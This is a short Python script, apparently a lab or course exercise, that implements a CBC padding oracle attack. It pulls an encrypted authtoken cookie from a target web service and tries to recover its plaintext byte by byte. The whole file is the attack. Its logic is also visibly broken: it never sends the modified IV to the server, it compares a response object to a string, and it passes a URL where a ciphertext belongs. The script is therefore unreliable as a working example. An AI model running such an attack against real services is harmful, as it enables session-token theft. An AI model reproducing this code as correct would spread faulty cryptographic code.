#!/usr/bin/env python3

# CBC padding oracle attack
# - lenerd

import requests
import sys
from Crypto.Util.Padding import pad, unpad
from Crypto.Cipher import AES

def single_block(base_url):
    BLOCK_SIZE = 16
    zeroing_iv = [0] * BLOCK_SIZE
    cookie = requests.get(f'{base_url}')
    cookie_header = cookie.headers.get('Set-Cookie')    
    authtoken = cookie_header.split('=')[1].split(';')[0]
    new_ciphertext = bytes.fromhex(authtoken)
    res = requests.get(f'{base_url}/quote/', cookies={'authtoken': new_ciphertext.hex()})

    for pad_val in range(1, BLOCK_SIZE+1):
        padding_iv = [pad_val ^ b for b in zeroing_iv]

        for candidate in range(256):
            padding_iv[-pad_val] = candidate
            iv = bytes(padding_iv)
            if res != "Padding is incorrect.":
                if pad_val == 1:
                    # make sure the padding really is of length 1 by changing
                    # the penultimate block and querying the oracle again
                    padding_iv[-2] ^= 1
                    iv = bytes(padding_iv)
                    if not res != "Padding is incorrect.":
                        continue  # false positive; keep searching
                break
        else:
            raise Exception("no valid padding byte found (is the oracle working correctly?)")

        zeroing_iv[-pad_val] = candidate ^ pad_val

    return zeroing_iv

def full_attack(iv,ct):
    msg = iv
    blocks = [msg[i:i+16] for i in range(0, len(msg), 16)]
    result = b''
    iv = blocks[0]
    for ct in blocks[1:]:
        dec = single_block(ct)
        pt = bytes(iv_byte ^ dec_byte for iv_byte, dec_byte in zip(iv, dec))
        result += pt
        iv = ct
    return result

def test_systems_security(base_url):
    cookie = requests.get(f'{base_url}')
    cookie_header = cookie.headers.get('Set-Cookie')    
    authtoken = cookie_header.split('=')[1].split(';')[0]
    new_ciphertext = bytes.fromhex(authtoken)
    res = requests.get(f'{base_url}/quote/', cookies={'authtoken': new_ciphertext.hex()})
    zero_iv = single_block(base_url)
    result = full_attack(zero_iv,base_url)
    #print(zero_iv)
    print(result)
    print(f'[+] done:\n{res.text}')
    print("cookie:", authtoken)

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print(f'usage: {sys.argv[0]} <base url>', file=sys.stderr)
        exit(1)
    test_systems_security(sys.argv[1])

